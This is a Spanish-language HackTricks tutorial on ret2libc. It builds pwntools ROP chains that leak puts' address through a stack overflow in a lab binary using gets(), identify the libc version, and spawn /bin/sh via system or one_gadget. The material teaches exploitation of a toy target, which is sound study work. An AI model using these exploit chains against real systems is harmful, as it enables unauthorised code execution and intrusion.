# Filtrando la dirección de libc con ROP

{{#include ../../../../../banners/hacktricks-training.md}}

## Resumen Rápido

1. **Encontrar** el **offset** de desbordamiento
2. **Encontrar** el gadget `POP_RDI`, `PUTS_PLT` y `MAIN`
3. Usar los gadgets anteriores para **filtrar la dirección de memoria** de puts u otra función de libc y **encontrar la versión de libc** ([descárgalo](https://libc.blukat.me))
4. Con la biblioteca, **calcular el ROP y explotarlo**

## Otros tutoriales y binarios para practicar

Este tutorial va a explotar el código/binario propuesto en este tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Otros tutoriales útiles: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)

## Código

Nombre del archivo: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - Filtrando la plantilla de LIBC

Voy a usar el código ubicado aquí para hacer el exploit.\
Descarga el exploit y colócalo en el mismo directorio que el binario vulnerable y proporciona los datos necesarios al script:

{{#ref}}
rop-leaking-libc-template.md
{{#endref}}

## 1- Encontrar el offset

La plantilla necesita un offset antes de continuar con el exploit. Si se proporciona alguno, ejecutará el código necesario para encontrarlo (por defecto `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Ejecuta** `python template.py` se abrirá una consola GDB con el programa que se está bloqueando. Dentro de esa **consola GDB** ejecuta `x/wx $rsp` para obtener los **bytes** que iban a sobrescribir el RIP. Finalmente, obtén el **offset** usando una consola **python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../images/image (140).png>)

Después de encontrar el offset (en este caso 40), cambia la variable OFFSET dentro de la plantilla usando ese valor.\
`OFFSET = "A" * 40`

Otra forma sería usar: `pattern create 1000` -- _ejecutar hasta ret_ -- `pattern seach $rsp` desde GEF.

## 2- Encontrando Gadgets

Ahora necesitamos encontrar gadgets ROP dentro del binario. Estos gadgets ROP serán útiles para llamar a `puts` para encontrar la **libc** que se está utilizando, y más tarde para **lanzar el exploit final**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
El `PUTS_PLT` es necesario para llamar a la **función puts**.\
El `MAIN_PLT` es necesario para llamar a la **función main** nuevamente después de una interacción para **explotar** el desbordamiento **nuevamente** (rondas infinitas de explotación). **Se utiliza al final de cada ROP para llamar al programa nuevamente**.\
El **POP_RDI** es necesario para **pasar** un **parámetro** a la función llamada.

En este paso no necesitas ejecutar nada, ya que todo será encontrado por pwntools durante la ejecución.

## 3- Encontrar la biblioteca libc

Ahora es el momento de encontrar qué versión de la **biblioteca libc** se está utilizando. Para hacerlo, vamos a **leak** la **dirección** en memoria de la **función** `puts` y luego vamos a **search** en qué **versión de la biblioteca** se encuentra la versión de puts en esa dirección.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Para hacerlo, la línea más importante del código ejecutado es:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Esto enviará algunos bytes hasta que **sobrescribir** el **RIP** sea posible: `OFFSET`.\
Luego, establecerá la **dirección** del gadget `POP_RDI` para que la siguiente dirección (`FUNC_GOT`) se guarde en el registro **RDI**. Esto se debe a que queremos **llamar a puts** **pasándole** la **dirección** de `PUTS_GOT` ya que la dirección en memoria de la función puts se guarda en la dirección apuntada por `PUTS_GOT`.\
Después de eso, se llamará a `PUTS_PLT` (con `PUTS_GOT` dentro del **RDI**) para que puts **lea el contenido** dentro de `PUTS_GOT` (**la dirección de la función puts en memoria**) y **la imprima**.\
Finalmente, **la función main se llama de nuevo** para que podamos explotar el desbordamiento nuevamente.

De esta manera hemos **engañado a la función puts** para que **imprima** la **dirección** en **memoria** de la función **puts** (que está dentro de la biblioteca **libc**). Ahora que tenemos esa dirección, podemos **buscar qué versión de libc se está utilizando**.

![](<../../../../../images/image (141).png>)

Como estamos **explotando** algún binario **local**, **no es necesario** averiguar qué versión de **libc** se está utilizando (solo encuentra la biblioteca en `/lib/x86_64-linux-gnu/libc.so.6`).\
Pero, en un caso de explotación remota, aquí explicaré cómo puedes encontrarla:

### 3.1- Buscando la versión de libc (1)

Puedes buscar qué biblioteca se está utilizando en la página web: [https://libc.blukat.me/](https://libc.blukat.me)\
También te permitirá descargar la versión descubierta de **libc**

![](<../../../../../images/image (142).png>)

### 3.2- Buscando la versión de libc (2)

También puedes hacer:

- `$ git clone https://github.com/niklasb/libc-database.git`
- `$ cd libc-database`
- `$ ./get`

Esto tomará un tiempo, ten paciencia.\
Para que esto funcione necesitamos:

- Nombre del símbolo de libc: `puts`
- Dirección de libc filtrada: `0x7ff629878690`

Podemos averiguar qué **libc** es la que probablemente se está utilizando.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Obtenemos 2 coincidencias (deberías probar la segunda si la primera no funciona). Descarga la primera:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Copia la libc de `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` a nuestro directorio de trabajo.

### 3.3- Otras funciones para filtrar
```python
puts
printf
__libc_start_main
read
gets
```
## 4- Encontrar la dirección de libc basada y explotar

En este punto deberíamos conocer la biblioteca libc utilizada. Como estamos explotando un binario local, usaré solo: `/lib/x86_64-linux-gnu/libc.so.6`

Así que, al principio de `template.py`, cambia la variable **libc** a: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Establecer la ruta de la biblioteca cuando se conozca`

Al dar la **ruta** a la **biblioteca libc**, el resto de la **explotación se calculará automáticamente**.

Dentro de la función `get_addr`, se calculará la **dirección base de libc**:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
> [!NOTE]
> Tenga en cuenta que **la dirección base final de libc debe terminar en 00**. Si ese no es su caso, es posible que haya filtrado una biblioteca incorrecta.

Luego, la dirección de la función `system` y la **dirección** de la cadena _"/bin/sh"_ se van a **calcular** a partir de la **dirección base** de **libc** y dada la **biblioteca libc.**
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Finalmente, se va a preparar el exploit de ejecución /bin/sh:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Vamos a explicar este ROP final.\
El último ROP (`rop1`) terminó llamando nuevamente a la función main, luego podemos **explotar nuevamente** el **desbordamiento** (por eso el `OFFSET` está aquí de nuevo). Luego, queremos llamar a `POP_RDI` apuntando a la **dirección** de _"/bin/sh"_ (`BINSH`) y llamar a la función **system** (`SYSTEM`) porque la dirección de _"/bin/sh"_ se pasará como un parámetro.\
Finalmente, se **llama** a la **dirección de la función exit** para que el proceso **salga correctamente** y no se genere ninguna alerta.

**De esta manera, el exploit ejecutará un \_/bin/sh**\_\*\* shell.\*\*

![](<../../../../../images/image (143).png>)

## 4(2)- Usando ONE_GADGET

También podrías usar [**ONE_GADGET** ](https://github.com/david942j/one_gadget) para obtener un shell en lugar de usar **system** y **"/bin/sh". ONE_GADGET** encontrará dentro de la biblioteca libc alguna forma de obtener un shell usando solo una **dirección ROP**.\
Sin embargo, normalmente hay algunas restricciones, las más comunes y fáciles de evitar son como `[rsp+0x30] == NULL`. Como controlas los valores dentro del **RSP**, solo tienes que enviar algunos valores NULL más para evitar la restricción.

![](<../../../../../images/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

Puedes encontrar una plantilla para explotar esta vulnerabilidad aquí:

{{#ref}}
rop-leaking-libc-template.md
{{#endref}}

## Problemas comunes

### MAIN_PLT = elf.symbols\['main'] no encontrado

Si el símbolo "main" no existe. Entonces puedes encontrar dónde está el código principal:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
y establece la dirección manualmente:
```python
MAIN_PLT = 0x401080
```
### Puts no encontrado

Si el binario no está utilizando Puts, deberías verificar si está utilizando

### `sh: 1: %s%s%s%s%s%s%s%s: no encontrado`

Si encuentras este **error** después de crear **todo** el exploit: `sh: 1: %s%s%s%s%s%s%s%s: no encontrado`

Intenta **restar 64 bytes a la dirección de "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{{#include ../../../../../banners/hacktricks-training.md}}
